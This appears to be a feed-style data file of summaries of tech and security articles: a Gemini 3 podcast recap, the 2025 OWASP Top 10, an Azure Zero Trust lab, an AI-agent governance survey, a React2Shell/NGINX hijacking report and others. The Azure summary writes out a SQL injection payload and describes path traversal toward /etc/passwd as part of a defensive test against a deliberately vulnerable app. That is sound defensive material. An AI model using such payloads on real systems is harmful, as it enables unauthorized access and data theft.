    "summary": "In this episode of the Agent Factory , Smitha Kolan and Vlad Kolesnikov are joined by Brandon Hancock, a full-stack engineer and the creator behind the YouTube channel AI with Brandon , where he teaches AI concepts to over 80,000 developers. This was a very special recording, taking place just hours after Google released several major updates, including the new flagship model Gemini 3 , the Antigravity coding environment, and updates to the Gemini CLI . We spent the episode exploring these new tools through live demonstrations. Gemini 3 and Gemini CLI Gemini 3 is Google's newest flagship model, designed for advanced high-level reasoning and complex agentic operations, making it ideal for orchestration. Gemini CLI is a command-line interface that allows developers to interact with Gemini models directly from their terminal. It supports piping inputs and outputs, making it a powerful tool for chaining prompts and building lightweight \"AI employees\" without complex infrastructure. Building a Personal Portfolio with Gemini 3 Pro Timestamp: 01:18 Smitha kicked off the demos by using Google AI Studio and Gemini 3 Pro to build a personal website from scratch in minutes. The goal was to convert a LinkedIn profile into a deployed portfolio site. Input Data: She uploaded a PDF export of her LinkedIn profile, a personal headshot, and an inspiration image generated by Nano Banana (an image generation tool). Multimodal Prompting: She instructed Gemini 3 to use the PDF for content and the Nano Banana image for stylistic direction. Iterative Refinement: When the initial output had a placeholder image, Smitha used the annotation feature in AI Studio to highlight the specific section and ask Gemini to fix it using her uploaded photo. Deployment: The final result was deployed directly to Cloud Run with a single click. Creating \"AI Employees\" with Gemini CLI Timestamp: 07:54 Brandon showcased how he uses the Gemini CLI to build what he calls \"AI Employees.\" His demo focused on a market research agent designed to find potential customers for his startup in the Emergency Medical Services space. Standard Operating Procedures (SOPs): Brandon treats prompts as SOPs stored in markdown files. He uses Gemini 3 Pro to write the high-level instructions and the faster, cheaper Gemini 2.5 Flash to execute the \"worker bee\" tasks. Parallel Execution: He demonstrated a Python script that calls the Gemini CLI to run multiple agents in parallel. This allowed him to search for leads across multiple cities (e.g., Miami) simultaneously. The Cheat Code: Brandon explained how passing a Python script to Gemini allows the model to understand the parameters and kick off the workflow itself, effectively automating the automation. The \"Anya the Capybara\" Video Agent Timestamp: 18:15 Vlad demonstrated an agent built with the Agent Development Kit (ADK) that turns technical documentation into engaging educational videos hosted by an AI character, \"Anya the Capybara.\" Agent Architecture: The system uses a root orchestrator agent that manages two sub-agents: a Script Sequencer (which adapts technical text into a natural script and chunks it into 8-second segments) and a Video Generator . Consistency: To keep the character consistent, Vlad used Nano Banana to generate four specific views of the Capybara. The agent randomly selects a view for each chunk to keep the video dynamic. Antigravity in Action: Vlad revealed that he used the new Antigravity feature to refactor his agent's code. He simply asked Antigravity to make changes to the prompts and sub-agents, and the tool handled the coding work automatically. Video Stitching: Finally, he used the Gemini CLI to write an FFmpeg command to stitch the 92 generated video chunks into a single, cohesive 11-minute video. Check out the code for this video generating agent here . The AI-First Mindset Timestamp: 10:21 In between the demos, we discussed the philosophy behind building these tools. Brandon shared his approach to productivity in the age of AI. The Concept of AI Employees Timestamp: 15:50 Brandon explained his goal to be \"AI first\" for everything. He views his agents not just as scripts, but as employees that free him up to focus on high-level strategy. By creating folders of \"Standard Operating Procedures\" (markdown files), he can assign tasks like market research or drafting emails to GeminiI. He noted that the barrier to entry is now so low that you did not need any coding experience to spin up a \"workforce\" of Gemini models to handle repetitive tasks at scale. The \"Ghostwriter\" Workflow Timestamp: 15:50 Beyond market research, Brandon touched on how he uses Gemini CLI as a \"ghostwriter.\" By hooking up an MCP (Model Context Protocol) server to Gmail, he can feed the AI his previous writing styles and have it draft responses to emails. The key, he emphasized, is providing the AI with the right context so it \"knows who it is\" before it begins the task. Conclusion This episode highlighted just how fast the development cycle has become. With tools like Gemini 3 Pro for reasoning, Gemini CLI for rapid execution, and Antigravity for code refactoring, we are seeing a shift where automating everything is becoming a reality. Whether you are building a personal website or a fleet of market research agents, the friction between idea and execution has never been lower. Your turn to build We challenge you to try building your own \"AI Employee\" this week using the Gemini CLI. Start with a simple task you do repeatedly, write an SOP in markdown, and see if you can get Gemini to take it off your plate. Check out the full episode to see the code in action!

    "title": "Software supply chain risks join the OWASP top 10 list, access control still on top",
    "summary": "Software supply chain failures and mishandling of exceptional conditions are some of the additions to the updated OWASP Top 10 , a list of top web application vulnerabilities. Most of the list has remained unchanged since 2021. In fact, the top item, broken access control, has been on the Open Worldwide Application Security Project’s list since it was first released in 2003. “Everyone tries to craft their own authentication and access control mechanisms,” says Jeff Williams, CTO and cofounder at Contrast Security. Williams created the list and served as the chair of the OWASP board for eight years. There are standard mechanisms out there, but most applications have specialized needs, he says. “I’ve seen some really god-awful horrific machines that people have built to do access control checks, and they don’t build them elegantly. They build them piece by piece. ‘Oh, we’re building this function, we need to do an access check’ — and they build their own access check. And almost nobody tests access control.” A typical web application may have a hundred endpoints, Williams says, each one of which can be accessed by a number of different roles. “Now you have to make sure that each of those routes work in each of those roles. Most people do a scan of their application with one role in mind, like that of a normal user. And maybe with an admin user. But there could be twenty different roles, so it’s very difficult to verify.” AI didn’t make the top ten list, but it was included in a “next steps” section of issues on the cusp of inclusion, in addition to a lack of application resilience and memory management failures. This AI category is titled: X03:2025 Inappropriate Trust in AI Generated Code (‘Vibe Coding’). “Although we didn’t have data to support the fact that AI-generated code is causing significantly more risk than human-written code available, thanks to community feedback, professional experience, and constant online sharing of such data, we felt it prudent to add a section,” says Tanya Janca, lead author of the OWASP Top 10. Developers should read and fully understand AI-generated code before committing it, she says. The OWASP Top 10 list is based on a combination of security data from a dozen different organizations, covering nearly 3 million applications, as well as a survey of 221 security experts, says security metrics expert Aram Hovsepyan, CEO at Codific and an OWASP contributing member. Here are the top 10: 1 – Broken access control When applications fail to properly enforce restrictions on what authenticated users are allowed to do, allowing attackers to access unauthorized functionality or data. For example, an attacker might manipulate an URL parameter to access another user’s account information or escalate their privileges from a regular user to an administrator. This item now includes server-side request forgery, which was its own list item in 2021. 2 – Security misconfiguration Security settings are not properly defined, implemented, or maintained, leaving systems exposed to attack. Common examples include default credentials that are never changed, unnecessary features left enabled, verbose error messages that reveal sensitive information, or cloud storage buckets left publicly accessible. This vulnerability jumped from fifth place in 2021 to second place in 2025. 3 – Software supply chain failures Attackers compromise software during the build, distribution or updates to inject malicious code that gets distributed to multiple organizations. For example, attackers might compromise a popular open-source library and inject malicious code that then gets incorporated into thousands of applications that depend on it or breach a vendor’s system to insert backdoors into legitimate software updates. This is a new list item, though there was a narrower related item in 2021 — vulnerable and outdated components. “Developers have become a primary target for many online attacks now,” says Janca. “It is no longer a problem of including a library that has a questionable dependency.” Instead, she says, there are now active attacks against the IDE, against the CI/CD pipeline, against plugins and repositories, against developer workstations, and more. “The entire software supply chain is currently a focus for attackers,” she says. 4 – Cryptographic failures Applications fail to properly protect sensitive data through encryption or use weak or broken cryptographic algorithms. Examples include transmitting sensitive data in clear text, using weak encryption algorithms, not properly validating SSL/TLS certificates, or storing passwords without proper hashing. These failures often lead to sensitive data exposure or system compromise. This item moved down from second place on 2021’s list. 5 – Injection Untrusted data is submitted as part of a command or query, tricking the application into executing unintended commands or accessing unauthorized data. Examples range from cross-site scripting, where attackers inject malicious scripts into web pages viewed by other users, to SQL injection, where they use database queries to access or modify sensitive data. This item has also moved a couple of spots down on this year’s list. 6 – Insecure design Security wasn’t properly considered during the design phase of the application, resulting in missing or ineffective controls. Examples include failing to implement proper threat modeling, not establishing security requirements before development begins, or designing systems that lack defense in depth. This category was introduced in 2021 to focus on design and architectural flaws rather than implementation bugs, but it’s moved down a couple of places because the industry has made noticeable improvements in threat modeling. 7 – Authentication failures Applications fail to properly verify the identity of users or fail to protect authentication credentials and session tokens. Examples include allowing brute force attacks, permitting weak passwords, exposing session IDs in URLs, not properly invalidating sessions after logout, or failing to implement multi-factor authentication for sensitive functions. 8 – Software or data integrity failures Applications fail to maintain trust boundaries and verify the integrity of software, code, and data artifacts. Examples include applications that rely on plugins, libraries, or modules from untrusted sources without integrity checks, insecure CI/CD pipelines that allow code to be modified before deployment, or applications that auto-update without verifying digital signatures. 9 – Security logging and alerting failures Applications fail to log security-relevant events or fail to alert security teams when suspicious activities occur. Examples include not logging failed login attempts, storing logs locally without backup, logging insufficient detail to reconstruct attacks or generating logs that don’t integrate with security information and event management (SIEM) systems. Great logging with no alerting is of minimal value in identifying security incidents. 10 – Mishandling of exceptional conditions Applications fail to properly handle errors, edge cases, and abnormal conditions, leading to security vulnerabilities. Examples include displaying detailed error messages that reveal sensitive information about system architecture, security checks that fail and allow unauthorized access when errors occur, or applications that crash and expose sensitive data in memory dumps. This is a category that has been just outside the top 10 for several years, says Brian Glas, department chair of computer science at Union University and an OWASP project leader. What took this item over the top was not the data about existing vulnerabilities, he says, but the survey of experts. “If it was purely data-driven, we would not have an accurate list as it would only be looking into the past.” Related stories: 10 most critical LLM vulnerabilities Managing agentic AI risk: Lessons from the OWASP Top 10 Understanding OWASP’s Top 10 list of non-human identity critical risks Keeping up with AI: OWASP LLM AI Cybersecurity and Governance Checklist",

    "title": "Zero Trust with Azure Firewall, Azure DDoS Protection and Azure WAF: A practical use case",
    "summary": "Introduction Zero Trust has emerged as the defining security ethos of the modern enterprise. It is guided by a simple but powerful principle: “Never trust, always verify.” This principle is more relevant now than ever as cyberattacks continue to trend upward in both frequency and impact, affecting organizations of every size and industry. No entity large or small can assume immunity. As a result, adopting Zero Trust is no longer optional, it is a foundational requirement for designing secure, resilient architectures. A key tenet of Zero Trust is the assumption of breach, thus designing systems with the expectation that threats may already exist both outside and inside the network perimeter. To implement this principle, you need multiple, independent security controls that inspect traffic at different layers and enforce least privilege access continuously. Relying on a single security control, even a highly capable one, leaves gaps that modern attackers are adept at exploiting. It is within this context that combining the use of Azure Firewall, Azure DDoS Protection and Azure Web Application Firewall (WAF) services to secure Web Applications while protecting the network perimeter becomes important. Together, these services deliver comprehensive protection across the network and application layers. Defense-in-depth: Why Azure WAF, Azure DDoS Protection and Azure Firewall are essential for Zero Trust In these sections ahead, we examine the common network and application-layer attack vectors that target modern web applications and illustrate how Azure WAF, Azure DDoS protection, and Azure Firewall, when layered strategically, work in tandem to mitigate these threats. The architecture The test environment was designed to reflect a common Azure deployment pattern: Azure DDoS Protection at the edge, to defend against a comprehensive set of network layer (layer 3/4) attacks Azure Application Gateway with WAF , inspecting inbound HTTP traffic for application-layer threats Azure Firewall Premium behind the gateway, providing network-layer protection, deep packet inspection, and outbound traffic governance. A backend subnet hosting an intentionally vulnerable application (OWASP Juice Shop) to simulate real-world attack scenarios. Traffic flows through the DDoS first, then WAF, and then the firewall, before reaching the backend. Outbound traffic from the backend is routed through the firewall for inspection. This ensures that all inbound and outbound traffic is scrutinized. Two access paths that will be tested: Via the Application Gateway public IP, where traffic passes through DDoS, WAF and Firewall. Via the Firewall public IP using a DNAT rule, where traffic bypasses WAF and is inspected only by the Firewall. The following scenarios illustrate how this complementary protection strengthens overall resilience: Scenario 1: SQL injection (application-layer attack) Let’s say an attacker on the internet attempts to access the application’s login endpoint via the Application Gateway IP address and injects a SQL payload into the input field. For example, the attacker submits a request containing the following payload in the User ID field: ?id=' OR 1=1 -- Azure WAF will receive the request, analyze, and if Azure WAF is deployed in Prevention mode, it will immediately detect the SQL injection attempt using its built-in Managed Ruleset. Upon detection, Azure WAF will return a WAF block page, preventing the request from ever reaching the application. By contrast, when the same application is accessed through a firewall-only path (for example, via a DNAT rule on Azure Firewall that exposes the application on port 443), Azure Firewall allows the traffic as it does not perform deep Application layer inspection and SQL injection payloads when embedded within the HTTP request body, appear legitimate at the network layer. Here is a snapshot of the attacker gaining access to the admin role when they insert this SQL injection attack without Azure WAF and only Azure Firewall in the path. Scenario 2: Volumetric and application-layer DDoS attacks Next, the attacker launches a volumetric network layer DDoS (SYN/UDP floods) to saturate bandwidth, but Azure DDoS Network Protection absorbs and scrubs the attack at the edge , so no traffic reaches Application Gateway, WAF, or Firewall. When the network layer attack fails, they shift to HTTP flood attack at the application layer, overwhelming the web application with a high volume of requests. Some requests include exploit attempts, while others are designed purely to exhaust application resources. Azure WAF here , can identify malicious patterns such as: Automated bots lacking proper headers Abnormal request rates Known exploit payloads embedded within requests Malicious IP addresses Note: Azure DDoS Protection is a comprehensive service that provides protection across network layers (Layer 3 and 4) , while HTTP DDoS Protection specifically targets application-layer attacks (Layer 7) and is integrated with Azure WAF . They are complementary services designed to defend against different types of threats within the Azure environment. Additionally, if the botnet’s IPs are known threat actors or malicious traffic, Azure Firewall’s threat intelligence and IDPS will be able to flag this traffic too. Together, these services form a complementary, defense-in-depth strategy for protecting Azure workloads against distributed denial-of-service attacks. Scenario 3: Path Traversal Attempt/Information leak : (Application-Layer Attack) Next, the attacker sends HTTP requests to access sensitive system files such as /etc/passwd by sending crafted HTTP requests to the application via the Application Gateway public IP address . The request successfully passes through Azure Application Gateway WAF, as it does not trigger a managed rule violation in this case. However, when the request reaches Azure Firewall, the Firewall’s IDPS detects the malicious pattern in the HTTP header and blocks the connection before it can reach the backend workload. Because the backend connection is denied by Azure Firewall, Application Gateway is unable to establish a successful response and returns a 504 Gateway Timeout to the client, rather than a 403 Forbidden response that would typically be generated by WAF when it blocks traffic. Below is the log from Azure Firewall showing that its able to detect this traffic as – Attempted Information Leak. As seen below, the traffic passed Application Gateway+WAF but was caught by Azure Firewall: This scenario highlights an important architectural outcome: The combination of WAF and Azure Firewall provides layered enforcement, even if an attack manages to slip past Azure WAF, Azure Firewall adds an additional enforcement layer to ensure the application remains protected. Now, let’s look at some more Network Layer attacks: Scenario 4: Network reconnaissance and breach In this scenario, port 3389 is exposed on Application Gateway using the L4 TCP Proxy option . Now, the attacker attempts to scan the Application Gateway on all the ports/protocols and found that port 3389 was open along with other ports such as ports 80, 8080, 3000. Azure WAF will alert us for Layer 7/Application exploit but cannot verify/validate the attack on port 3389 since it was purely Layer 3/4 and contained no HTTP payload for WAF inspection. The L4 proxy listener on App Gateway simply forwards the raw TCP connections to the Azure Firewall behind it. Azure Firewall, however, performs full network‑layer inspection across all ports and protocols, allowing it to detect and alert on this type of L3/L4 reconnaissance even when App Gateway had the port open via the TCP proxy feature. As seen below the traffic passed Application Gateway+WAF but was caught by Azure Firewall since it is non-HTTP: The attacker then tries a different approach: Now the attacker somehow compromises a workstation inside our network and attempts to move laterally to the web server via RDP on port 3389 and/or attempts to exfiltrate and try to access something outside of the network. Azure Firewall located inside the VNet blocks the RDP attempt (if there is no rule allowing it) and if there is, its IDPS flags/blocks the traffic as suspicious. In this case, Azure WAF will not be involved but Azure Firewall inspects this internal and/or outbound traffic and blocks it. This illustrates how a combination of the two stops the attacker at multiple points: firewall foiled the reconnaissance and lateral movement/exfiltration, WAF foiled the application exploit. We can see below the outbound malicious attempt caught by Azure Firewall IDPS: In summary, Azure WAF is like the “bodyguard at the application’s front door” – inspecting every HTTP request in detail and ejecting those carrying hidden weapons or exhibiting bad behavior. It focuses on the web layer, which Azure Firewall or DDoS alone cannot fully protect. If we only had the WAF and no network firewall or DDoS, we’d be safe from many web attacks but would remain exposed to network-level threats (e.g., someone trying to RDP into a VM, or flooding a non-HTTP service). Conversely, if we had only the firewall, a crafty attacker could still exploit a vulnerability in our web app with a well-crafted HTTP request that looks “allowed” to the firewall – that’s where the WAF comes in to catch it. Azure Firewall on the other hand, acts as the “moat and drawbridge” to your cloud network: it keeps out the obvious bad guys at the gate, tightly limits what’s allowed in or out (no implicit trust for internal IPs), and uses threat intel + signatures to sniff out known threats in any traffic it passes, even outbound traffic. The table below shows the traffic flow that will be filtered by Azure WAF vs Azure Firewall. As you can see, layered security is fundamental to Zero Trust Conclusion In a Zero Trust architecture, security cannot rely on implicit trust or a single layer of defense. The combination of Azure Firewall Premium, Azure DDoS protection and Azure Application Gateway WAF exemplifies defense-in-depth by protecting both network and application layers. Organizations hosting internet-facing applications should adopt this layered strategy to reduce exposure to modern threats, prevent lateral movement, and maintain strict control over outbound traffic. By implementing these services together, you align with Microsoft’s recommended best practices for Zero Trust and significantly strengthen your cloud security posture.

    "title": "1.5 million AI agents are at risk of going rogue",
    "summary": "A study released Wednesday by API management platform vendor Gravitee indicates that upwards of half of the three million agents currently in use by organizations in the US and UK “are ungoverned and at the risk of going rogue.” Based on a December 2025 survey of 750 IT executives and practitioners conducted by Opinion Matters, the results revealed that AI agents are being deployed faster than security teams can keep up. There are, said Rory Blundell , CEO of Gravitee, now over three million AI agents operating within corporations, which he described as a workforce larger than the entire global employee count at Walmart. The three million number is based on an extrapolation of survey results, based on government estimates of 8,250 UK businesses and 77,000 US businesses that employ 250 employees or more. The mean number of AI agents deployed per business is 36.9, and when respondents were asked if their organization “experienced or suspected an AI agent-related security or data privacy incident in the past 12 months,” 88% said that they had. The mean percentage of agents that are not actively monitored and secured, according to the findings, was 53% Asked what prompted the study, Blundell wrote in an email, “we’re all familiar with stories of AI agents going rogue: deleting codebases, leaking confidential information, inventing fake data. The working hypothesis that prompted this research was that, while agentic deployment is reaching an exciting stage, businesses have not yet caught up with agent governance. The research validates that.” A global problem Agents, he said, “can offer businesses a huge productivity gain, but we have to be realistic about the risks: without governance and oversight, they can easily start becoming liabilities, and a danger to consumers and businesses alike.” In addition, said Blundell, despite respondents being only from the UK and US, “this is absolutely a global problem. Companies around the world are using AI agents, and across the board there is a gap between the level of deployment and the level of governance. We have a strong customer base in the EU, where we see the same problems.” David Shipley , head of Canadian-based security awareness training firm Beauceron Security, said, “the only thing that shocks me is that people think it’s only 53% of agents that aren’t monitored. It’s higher.” He likened the results from the Gravitee study to a “lesson about the Titanic that everyone in technology keeps ignoring. The Titanic disaster didn’t happen because they didn’t know there would be icebergs on the trip. They knew it was peak iceberg season, they knew they were going too fast.” Shipley said that the ship’s captain and his crew “thought they’d detect [an iceberg]; if they didn’t, and hit one, that their technology controls would protect them to help them recover.” They put their faith in the so-called watertight compartments that, it turned out, weren’t watertight at the top, but, most importantly, they trusted the new wireless communications technology that they could use to call for help if they got in trouble. The equivalent today: “Well, IT and security can fix it if we get in trouble with our agents.” “Wrong then, super wrong now,” he said. He said, “we know AI agents are inherently dangerous and unreliable. There’s literally math proofs out there that show it. So, we know there are icebergs. Let me repeat this for those at the back of the room: 100% of AI agents have the potential to go rogue. If a vendor assures you it isn’t possible and their core technology is an LLM, they’re lying. We know we’re going too fast in adoption for the risks we know exist.” Shipley added, “now, the funny part: imagine if the Titanic still made the choices it did, knowing the watertight compartments didn’t work (aka monitoring is missing for 53% of AI agents), we know by the time IT and security roll on an AI agent risk, the damage is done (the ship’s sinking too fast and radio isn’t going to help because help will be too late). And we still made the choices we’re making.” The real issue is invisible AI, not rogue AI Manish Jain , principal research director at Info-Tech Research Group, said that as the “exponential” speed of AI development continues, his firm, based on experiences with CIOs and CDOs, predicts that there will be more AI agents globally by the year 2028 than the number of human employees. “It would be one of the biggest challenges for business and IT executives to govern them without curtailing the innovation that these AI agents bring with them,” he said. Even today, he noted, “we see that most enterprise AI agents are running without oversight. Many organizations don’t even know how many agents they have, where they’re running, or what they can touch. If you don’t know how many mules are in the barn, don’t act surprised when one kicks the door down.” Jain pointed out that AI agents are no different. “Unaccounted agents often emerge through sanctioned, low-code tools and informal experimentation, bypassing traditional IT scrutiny until something breaks. You cannot govern what you can’t see. So, we need to understand that the real issue isn’t ‘rogue AI’, it’s invisible AI.” Info-Tech, he added, “strongly believes that governing AI models or pre-approving agents is no longer enough, because invisible, rogue agents will do tandava (the dance of destruction) at runtime. This is because, when it comes to governing these AI agents, the number is so huge that approval gates will not be sustainable without halting the innovation. Continuous oversight should be the priority for AI governance after setting initial guardrails as part of the AI strategy.” Perspective, he said, also needs to change: “AI agents are no longer helpful bots. They often operate with delegated yet broad credentials, persistent access, and undefined accountability. This can become a costly mistake as overprivileged agents are the new insider threat. We need to define tiered access for AI agents. While we can’t avoid giving a few people keys to our house to speed up things, if you trust every stranger with your house keys, we wouldn’t be able to blame the locksmith when things go missing.”",

    "title": "How 1Password is Evolving its Partner Ecosystem",
    "summary": "Identity has become the defining security challenge for organizations navigating SaaS sprawl, AI adoption, and an increasingly distributed workforce. As access expands across applications, devices, and identities, customers need trusted partners who can help translate modern identity strategies into practical, scalable outcomes. At 1Password, partners play a critical role in how customers adopt, deploy, and grow with our company. As 1Password’s suite of solutions continues to evolve, so does the opportunity to support partners more intentionally. The new phase of the 1Password Partner Program reflects a focused investment in the partner ecosystem, strengthening how partners engage with 1Password and how partner-led efforts connect to long-term customer and business growth. “Partners are often the ones closest to the real-world challenges customers face around identity and access,” says Larissa Crandall, Global VP of Channel and Alliances at 1Password. “Our goal is to make it easier for partners to bring 1Password into those conversations and to build durable, profitable businesses alongside us.” Evolving the partner experience The updated 1Password Partner Program is designed to be simpler, more transparent, and globally consistent, while supporting different partner models across the ecosystem. The program is built around a unified structure that supports partners and best serves our mutual customers. Partners engage through a single program model with clear participation levels based on engagement and impact, making it easier to understand how to grow with 1Password over time. This approach makes it easier to engage with 1Password at the right level, whether partners are building foundational capabilities or scaling established practices. A core focus of this evolution is partner profitability. The program is designed to support recurring revenue, predictable growth, and long-term customer relationships, with incentives aligned to partner-led success and net-new customer acquisition. Enablement is a key part of driving profitability. Partners have access to ongoing sales and technical training, practical go-to-market resources, and learning paths designed to support both onboarding and long-term growth. The goal is to help partners lead confidently in customer conversations and scale their businesses over time. Together, these updates create a stronger connection between partner investment and long-term success, while making it easier for partners to build momentum with 1Password. What this means for the partner ecosystem For existing partners, this evolution brings clearer expectations, improved support, and a more predictable growth model. For partners exploring 1Password for the first time, it offers a straightforward way to add modern access management to a portfolio, supported by distributors, alliance partners, and enablement resources that accelerate time to value. The program also reinforces clear rules of engagement and deal protection, giving partners confidence that their investments in new opportunities are supported as they build and grow their practices. Why the 1Password Partner Program is evolving 1Password gives organizations a single, secure foundation to protect and manage every credential across every human, machine, and AI workflow. As that opportunity has grown, so has the importance of ensuring partners are equipped to engage clearly, deliver value consistently, and build lasting businesses around modern identity security. “Partners are essential to how customers experience and succeed with 1Password,” Crandall says. “As our brand has evolved, it was important for our partner experience to evolve with it, in a way that supports long-term growth for both partners and customers.” The evolution of the 1Password Partner Program reflects a more intentional investment in the partner ecosystem. The updates are designed to provide greater clarity in how partners work with 1Password, stronger alignment to net-new customer growth, and more meaningful enablement for partners building identity and security practices around the platform. Solutions partners can confidently build on At the center of the partner opportunity is 1Password’s suite of solutions, which fall under the umbrella of Extended Access Management. 1Password gives companies a single solution to ensure the right person or AI agent gets the right access, to the right applications, from the right device. This helps close critical access gaps that Single Sign-On alone cannot reach. With 1Password, partners can help customers: Discover unmanaged applications and hidden access risks Automate identity and access workflows for faster remediation and audit-ready compliance Enable secure, passwordless sign-in with context-aware access policies Improve productivity while reducing operational and support overhead This foundation allows partners to expand services, strengthen customer relationships, and attach recurring revenue to a platform their customers rely on every day. Looking ahead: partners and the future of identity at 1Password As organizations look toward 2026 and beyond, identity security is becoming more complex, not less. AI-powered tools, non-human identities, and increasingly decentralized application environments are reshaping how access needs to be managed. 1Password’s vision for the future centers on Extended Access Management: securing access not just for people, but also for applications, devices, and AI-driven workflows that fall outside the reach of traditional identity and access management solutions. Partners play a critical role in bringing this vision to life. “As identity expands to include AI, automation, and new ways of working, partners are essential to helping customers adopt these capabilities responsibly and securely,” Crandall said. “Our focus is on making sure partners are equipped to grow alongside this next phase of identity security.” By continuing to invest in the partner ecosystem, 1Password is aligning how it goes to market with where customer needs are heading. This ensures partners are positioned to support modern Zero Trust strategies, close emerging access gaps, and build scalable, future-ready identity security practices. What’s next Current partners can review updated program details and resources in the 1Password partner portal . Organizations that want to understand how 1Password fits into their business can take a closer look at the evolving partner program and broader ecosystem on the 1Password Partners page . 1Password will continue investing in partners as a core part of how our business grows, with a focus on long-term value and a shared mission. Secure every identity. Protect your customers. Grow your business.",

    "summary": "In a recent conversation with a Let’s Encrypt subscriber, we asked them to guess how many people work at ISRG, the nonprofit behind Let’s Encrypt (and Prossimo and Divvi Up). Their guess was about 100; they’d overestimated by 72.5 people. We’re a pretty small team, and we get a lot done, but most of that work is entirely remote, distributed, and automated. That is a big part of what makes FOSDEM special. For the last few years, we’ve had a stand at this annual conference in Belgium, where a few folks from our team have the opportunity to speak directly with thousands of conference-goers. We continue to learn so much from these conversations! That’s where the “Hello” part of this blog post comes in. At this year’s FOSDEM, we met so many Let’s Encrypt subscribers, and each of them has a unique relationship to Let’s Encrypt. We were pleasantly surprised by how many people told us they were using IP-address certificates , a new option we just made generally available in December. We had a lot of conversations about our plans to shorten certificate lifetimes . There were a few folks who asked about S/MIME ( still no plans to do that ). We invited people to continue to stay in touch by signing up for our newsletter . The most meaningful part of FOSDEM is being able to say “thank you”. Our goal in starting Let’s Encrypt was to improve security and privacy for people using the internet, but that could not be achieved without the now millions of folks who decided to get a certificate. Our impact is predicated on this symbiotic exchange. While we were only able to directly express our gratitude to a few thousand people at FOSDEM, it was a reminder of how important the community is.",

    "title": "Threat actors hijack web traffic after exploiting React2Shell vulnerability: Report",
    "summary": "Threat actors exploiting the React2Shell vulnerability in components of React servers are using their access to compromise web domains and divert web traffic for malicious purposes. That’s the conclusion of researchers at Datadog Security Labs, who said in a blog Wednesday that the primary targets are sites running the NGINX open-source web server managed with Boato Panel. These include Asian organizations with top level domains ending in .in, .id, .pe, .bd, .edu, .gov, and .th, as well as Chinese hosting infrastructure. The danger, said blog author Ryan Simon , a senior security researcher at Datadog Security Labs, is that a hacker can use a compromised site to do a number of nasty things such as fingerprint an organization’s web traffic, insert malware onto users’ computers, or divert traffic to a threat actor-controlled landing page that tries to trick users into giving up login credentials. These last two tactics also end up damaging a website’s reputation, Simon added, if the word gets around that the site hosts malware. NGINX is a “foundational element of contemporary web infrastructure,” the Datadog blog notes. The routing and processing of traffic by NGINX is governed by its configuration files. Poor configuration or a successful breach allow it to be used for web traffic hijacking. For CSOs, the defense against these attacks is to lock down those configuration files to resist their being tampered with. React2Shell is the exploitation of a vulnerability ( CVE-2025-55182 ) in the React 19 library for building application interfaces that was discovered late last year. The hole allows attackers to execute arbitrary code on affected servers. Related content: Anatomy of React2Shell Researchers at Greynoise said this week that exploitation activity targeting React Server Components has consolidated significantly. Two IP addresses now account for 56% of all observed exploitation attempts, down from 1,083 unique sources earlier. Unpatched versions of React are at risk of compromise. Initial abuse “What we saw in a lot of our honeypots and threat intelligence early on with React2Shell is attackers were using it for cryptomining,” said Simon. Others have seen exploitation used to deploy reverse shells. But more recently, Simon said, Datadog Security is seeing threat actors, once in an IT network, going after web servers to highjack their traffic. An analysis of the scripts used by threat actors on compromised NGINX web servers shows they use a multi-stage and automated approach to attacking the environments. The toolkits contain target discovery plus several scripts designed to establish persistence and for the creation of malicious configuration files containing instructions intended to redirect web traffic, says the Datadog blog. There is no commonality among the targeted organizations, Simon noted. Hijacking web traffic is an old tactic for threat actors. In fact David Shipley , head of Canadian security awareness training provider Beauceron Security, called these attacks on NGINX servers “a return to old-school hacking in the era of stronger identity controls like password managers, MFA and passkeys.” “If you’re up against a more robustly defended user, you go back to attacking the infrastructure so you can go back into attacker-in-the-middle mode for some good old session cookie capture and other hijinks on the NGINX,” he said. Finding and exploiting server side vulnerabilities or network security vulnerabilities is fast, cheap, and easy with AI, he added. Simon said CSOs can help protect NGINX servers from being exploited by monitoring configuration file integrity, including keeping records of their server configurations so any changes can be spotted. It’s vital that web servers have the latest security patches, he added. And admins should also monitor the NGINX security advisory website.",

    "summary": "Mission Accomplished — A Post in Every Security Section (Except the get the code section coming later) Mission accomplished. I have a post in every section on the new blog. Except the last one where I’m going to hopefully publish actual code — that’s coming later for various reasons. One of the cool things on substack is that you can follow only the sections that interest you most. One of the sections is for less technical users and people who want to secure their own assets. I created that section because invariably I’m giving a presentation on something unrelated and people just want to know how to “secure their own stuff.” I also get questions from my Mom who says she has no idea what I’m talking about. I’m going to try to keep it simpler in that section and explain technical things hopefully in terms anyone can understand, but maybe just on the edge of getting technical for those who need and want that information. That section is called Cybersecure Me and I just wrote a post about Bank Accounts and Yubikeys which seems to be pretty popular. The other section I hadn’t yet published in is called Security Insight . This is a catch all category for people who work for organizations trying to reduce cybersecurity risk. I might analyze breaches or provide insights that help companies lower their risk by taking various actions. This category might also be interesting for those who invest in cybersecurity products. I just posted about Using AI to Analyze Network Packets which I think is going to be a game change for defenders working in SOCs. As a side note I gripe about products and companies spamming the Internet with packets in the name of security. Overall I think this blog is more representative of me at the current moment than my existing Medium blog. It hits the categories I want to talk about more directly and it targets the different groups of people who have different interests a bit better. We’ll see how it works out. Subscribe for free.

    "title": "The platform usage trap part 1: Why high activity doesn’t necessarily mean high value",
    "summary": "For any organization that has invested in an internal developer platform, a question inevitably arises: Is it actually working? Simply tracking adoption rates won't tell you if your platform is truly delivering value to your developers. This was the challenge faced by John Lewis, a major UK retailer. In our previous articles (parts 1 and 2 ) we introduced the John Lewis Digital Platform (JLDP) and how it enabled dozens of product teams to build high-quality software rapidly to power www.johnlewis.com and other critical applications. But how did they know that the platform was actually successful? Traditional product metrics like revenue and sales don’t translate easily to this world. When you focus only on whether your tenants use the platform, you don’t understand whether it’s bringing them value. In this article, Alex Moss from the John Lewis platform team discusses how they moved beyond simple usage metrics to develop a sophisticated, multi-stage approach to measuring the real value of their platform — a journey that took them from lead-time metrics, to DORA , and finally to a \"Technical Health\" score. Along the way, they explore how the JLDP’s purpose evolved — and its value along with it. - Darren Evans Initial measurement: A focus on platform value In the early days of the platform, understanding its value was actually much easier. This was because the platform was created with a very clear purpose: to enable speed of change. The John Lewis business wanted to create multiple product teams working on several features of johnlewis.com in parallel, and to put those features in front of customers quickly for feedback. Its origins in the world of the company’s John Lewis Digital online business resulted in it being treated as a product from a very early stage, and therefore integrated with that area’s reporting mechanisms too. Thus, it became normal to link the platform objectives to the online business’s broader goals each quarter and report on measurable key results. This kept the focus on the reasons the platform is important: do improvements to the platform continue to justify using it over seeking out a different one? We cannot afford to rest on our laurels! The six annual measures reported against every quarter. The specific measures have varied over the years. In addition to this, in the first few years of the platform’s existence, there were three 